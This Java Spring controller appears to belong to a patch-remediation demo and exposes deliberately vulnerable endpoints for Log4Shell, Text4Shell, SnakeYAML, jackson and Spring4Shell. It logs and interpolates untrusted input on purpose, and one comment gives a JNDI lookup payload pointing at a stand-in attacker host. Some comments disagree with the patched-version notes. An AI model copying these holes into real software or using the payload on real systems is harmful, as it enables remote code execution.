package com.broadcom.vulndemo.web;

import com.broadcom.vulndemo.model.Vulnerability;
import com.broadcom.vulndemo.service.VulnerabilityRegistry;
import org.apache.commons.text.StringSubstitutor;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.springframework.web.bind.annotation.*;
import org.yaml.snakeyaml.Yaml;

import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;

/**
 * Intentionally-vulnerable demo endpoints. Each one exercises a real, unpatched
 * code path in a pinned dependency so the Tanzu remediation demo can show a live
 * exploit before-and-after patching.
 *
 * WARNING: every handler here is deliberately insecure. Do not copy into real code.
 */
@RestController
@RequestMapping("/api")
public class DemoController {

    // Deliberately using the vulnerable log4j2 logger (CVE-2021-44228).
    private static final Logger log = LogManager.getLogger(DemoController.class);

    private final VulnerabilityRegistry registry;

    public DemoController(VulnerabilityRegistry registry) {
        this.registry = registry;
    }

    /** Machine-readable CVE feed backing the dashboard. */
    @GetMapping("/cves")
    public List<Vulnerability> cves() {
        return registry.getAll();
    }

    /**
     * CVE-2021-44228 (Log4Shell). User input is logged verbatim; a payload such as
     * ${jndi:ldap://attacker/x} is interpolated by the vulnerable log4j-core 2.14.1.
     */
    @GetMapping("/log")
    public Map<String, String> logIt(@RequestParam(defaultValue = "hello") String message) {
        log.info("User supplied message: {}", message);
        return Map.of("logged", message,
                "note", "Input was logged by log4j-core 2.25.4 — message lookups disabled (CVE-2021-44228 fixed).");
    }

    /**
     * CVE-2022-42889 (Text4Shell). Untrusted input is interpolated by
     * StringSubstitutor, which resolves ${script:...}, ${dns:...} and ${url:...}.
     */
    @GetMapping("/lookup")
    public Map<String, String> lookup(@RequestParam(defaultValue = "${sys:user.name}") String expr) {
        // createInterpolator() enables the dangerous script/dns/url lookups — this
        // is exactly the CVE-2022-42889 code path.
        StringSubstitutor interpolator = StringSubstitutor.createInterpolator();
        Map<String, String> out = new LinkedHashMap<>();
        out.put("input", expr);
        try {
            String result = interpolator.replace(expr);
            out.put("interpolated", result);
            boolean resolved = !result.equals(expr);
            out.put("note", resolved
                    ? "commons-text resolved this lookup (CVE-2022-42889)."
                    : "commons-text 1.15.0 removed the script/dns/url lookups — the payload was "
                      + "returned verbatim, not executed (CVE-2022-42889 fixed).");
        } catch (Exception e) {
            out.put("interpolated", "");
            out.put("error", e.getClass().getSimpleName() + ": " + e.getMessage());
            out.put("note", "Interpolation refused by commons-text 1.15.0 (CVE-2022-42889 fixed).");
        }
        return out;
    }

    /**
     * CVE-2022-1471 (SnakeYAML). On snakeyaml 2.6 the default Yaml() no longer
     * instantiates arbitrary global-tagged types, so the original payload is
     * refused. We surface that refusal cleanly instead of a 500.
     */
    @PostMapping(value = "/yaml", consumes = "text/plain")
    public Object parseYaml(@RequestBody String yaml) {
        try {
            Yaml parser = new Yaml();
            Object loaded = parser.load(yaml);
            return Map.of("parsedType", loaded == null ? "null" : loaded.getClass().getName(),
                    "note", "Parsed by snakeyaml 2.6 (global-tag instantiation is now restricted).");
        } catch (Exception e) {
            return Map.of("refused", true,
                    "reason", e.getClass().getSimpleName() + ": " + firstLine(e.getMessage()),
                    "note", "snakeyaml 2.6 refused arbitrary-type construction (CVE-2022-1471 fixed).");
        }
    }

    private static String firstLine(String s) {
        if (s == null) return "";
        int nl = s.indexOf('\n');
        return nl < 0 ? s : s.substring(0, nl);
    }

    /**
     * CVE-2020-36518 (jackson-databind). Deeply nested JSON deserialization can
     * exhaust the stack. This endpoint echoes back the parsed structure.
     */
    @PostMapping(value = "/json", consumes = "application/json")
    public Map<String, Object> parseJson(@RequestBody Map<String, Object> body) {
        return Map.of("keys", body.keySet(),
                "note", "jackson 3.1.4 (tools.jackson) with nesting limits (CVE-2020-36518 fixed).");
    }

    /**
     * Spring4Shell (CVE-2022-22965) surface: a POJO bound directly from request
     * parameters via Spring MVC data binding on JDK 9+.
     */
    @PostMapping("/greeting")
    public Map<String, String> greeting(Greeting greeting) {
        return Map.of("greeting", "Hello, " + greeting.getName() + "!",
                "note", "POJO bound via Spring MVC data binding (CVE-2022-22965).");
    }

    /** Simple command bean bound from request parameters (Spring4Shell surface). */
    public static class Greeting {
        private String name = "world";
        public String getName() { return name; }
        public void setName(String name) { this.name = name; }
    }
}
